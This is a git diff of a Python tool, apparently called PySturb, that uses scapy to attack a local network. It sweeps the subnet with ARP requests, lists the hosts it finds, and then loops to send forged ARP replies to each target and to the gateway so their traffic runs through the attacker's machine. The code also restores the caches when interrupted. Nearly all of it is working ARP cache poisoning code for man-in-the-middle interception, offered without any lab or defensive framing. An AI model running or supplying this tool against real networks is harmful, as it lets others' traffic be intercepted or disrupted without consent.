@@ -1,8 +1,11 @@
+# import psutil
 import json
 import inquirer
 import socket
 import netifaces
 import scapy.all as scapy
+import time
+import signal
 
 # Print prettified json
 def jprint(args):
@@ -12,13 +15,17 @@ def jprint(args):
 def pprint(args):
     jprint(vars(args))
 
-class Pysturb:
+class Address:
+    def __init__(self, ip, mac):
+        self.ip = ip
+        self.mac = mac
+
+class PySturb:
     def __init__(self):
         self.iface_list = self.get_iface_list()
         self.iface = None
-        self.ip_addr = None
+        self.addr = None
         self.gateway = None
-        self.mac_addr = None
         self.targets = None
 
     # Display interface selection menu
@@ -47,12 +54,17 @@ class Pysturb:
             return
 
         # Assign addresses to global variable
-        self.ip_addr = addrs[netifaces.AF_INET][0].get('addr')
-        self.mac_addr = addrs[netifaces.AF_LINK][0].get('addr')
+        ip = addrs[netifaces.AF_INET][0].get('addr')
+        mac = addrs[netifaces.AF_LINK][0].get('addr')
+        self.addr = Address(ip, mac)
+
         netmask = addrs[netifaces.AF_INET][0].get('netmask')
         self.cidr = sum(bin(int(x)).count('1') for x in netmask.split('.'))
+
         gateways = netifaces.gateways()[netifaces.AF_INET]
-        self.gateway = [x[0] for x in gateways if x[1] == iface][0]
+        gw_ip = [x[0] for x in gateways if x[1] == iface][0]
+        gw_mac = scapy.getmacbyip(gw_ip)
+        self.gateway = Address(gw_ip, gw_mac)
 
         # Scan targets
         self.targets = self.scan_targets()
@@ -61,38 +73,75 @@ class Pysturb:
     def get_iface_list(self):
         return [i for i in netifaces.interfaces() if i != 'lo']
 
-    def flood_scan(self):
+    def flood_attack(self):
         pass
 
-
     def scan_targets(self):
-        #sementara:v
-        targets = list()
-        ips=self.ip_addr + '/' + str(self.cidr)
-        request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ips)
-        ans, unans = scapy.srp(request, iface=self.iface, timeout=1, verbose=0)
-        for send, recv in ans:
-            if recv:
-                target = dict()
-                target["ip_addr"] = recv[scapy.ARP].psrc
-                target["mac_addr"] = recv[scapy.ARP].hwsrc
-                targets.append(target)
-        return targets
+        print(' [*] Scanning network...  (Press CTRL+C to stop)\n')
+        ips=self.addr.ip + '/' + str(self.cidr)
+        ret = []
+        global interrupt_loop
+        global original_sigint
+        interrupt_loop = False
+        original_sigint = signal.getsignal(signal.SIGINT)
+        def handler(sig, frame):
+            global interrupt_loop
+            global original_sigint
+            interrupt_loop = True
+            signal.signal(signal.SIGINT, original_sigint)
+        signal.signal(signal.SIGINT, handler)
+        while not interrupt_loop:
+            request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ips)
+            ans, unans = scapy.srp(request, iface=self.iface, timeout=1, verbose=0)
+            for send, recv in ans:
+                if recv:
+                    ip = recv[scapy.ARP].psrc
+                    mac = recv[scapy.ARP].hwsrc
+                    if ip != self.gateway.ip and not any(x.ip == ip for x in ret):
+                        ret.append(Address(ip, mac))
+                        print('     [{}] MAC: {}   IP: {}'.format(len(ret), mac, ip))
+            time.sleep(0.5)
+        return ret
 
-    def perform_arp_poison(self):
-        for target in self.targets:
-            print("Poisoning target with IPv4: {} and MAC: {}".format(target['ip_addr'], target['mac_addr']))
-            scapy.send(scapy.Ether(dst=target['mac_addr'])
-                    /scapy.Dot1Q(vlan=1)
-                    /scapy.Dot1Q(vlan=2)
-                    /scapy.ARP(op="who-has", 
-                        psrc=self.ip_addr, 
-                        pdst=target['ip_addr']), 
-                        inter=scapy.RandNum(10, 40), 
-                        loop=1)
+    # Send forged arp response
+    def arp_spoof(self, target, host, verbose=True):
+        # Forging arp response frame
+        arp_response = scapy.ARP(pdst=target.ip, hwdst=target.mac, psrc=host.ip, hwsrc=host.mac, op='is-at')
+        # Send the forged frame
+        scapy.send(arp_response, verbose=0)
+        # Print message
+        if verbose:
+            print(" [+] Packet sent to {} \t : {} is-at {}".format(target.ip, host.ip, host.mac))
 
-worker = Pysturb()
+    # Begin arp cache poisoning
+    def begin_arp_cache_poisoning(self, verbose=True):
+        # Loop with 1 second delay
+        while True:
+            # Iterating targets
+            for target in self.targets:
+                # Spoofing target mac address with our own address
+                spoofed_target = Address(target.ip, self.addr.mac)
+                spoofed_gateway = Address(self.gateway.ip, self.addr.mac)
+                # Performing arp spoofing
+                self.arp_spoof(target, spoofed_gateway, verbose)
+                self.arp_spoof(self.gateway, spoofed_target, verbose)
+            time.sleep(1)
+            
+
+    # Send legitimate arp response to restore the network
+    def restore(self, verbose=True):
+            for target in self.targets:
+                self.arp_spoof(target, self.gateway, verbose)
+                self.arp_spoof(self.gateway, target, verbose)
+
+worker = PySturb()
 worker.prompt_select_iface()
-worker.perform_arp_poison()
-print(worker.targets)
 
+try:
+    print('\n [*] Begin ARP cache poisoning...\n')
+    worker.begin_arp_cache_poisoning()
+except KeyboardInterrupt:
+    print('\n [*] Restoring network...\n')
+    worker.restore()
+
+# pprint(worker)
